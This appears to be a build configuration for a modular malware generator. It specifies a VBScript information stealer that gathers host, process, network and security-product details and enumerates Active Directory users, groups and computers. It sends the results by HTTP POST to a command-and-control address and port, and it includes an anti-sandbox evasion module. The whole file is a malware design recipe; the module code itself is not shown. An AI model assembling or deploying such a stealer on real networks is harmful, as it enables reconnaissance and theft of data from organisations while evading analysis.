name: vbs_infostealer_ad
description: VBScript AD recon with domain user/group/computer enumeration
format: vbscript

core:
  - core/emit_buffer
  - core/run_cmd

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/security_products
  - ad_collectors/ad_users
  - ad_collectors/ad_groups
  - ad_collectors/ad_computers

exfil: exfil/http_post
arch: arch/sequential

evasion:
  - evasion/anti_sandbox

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
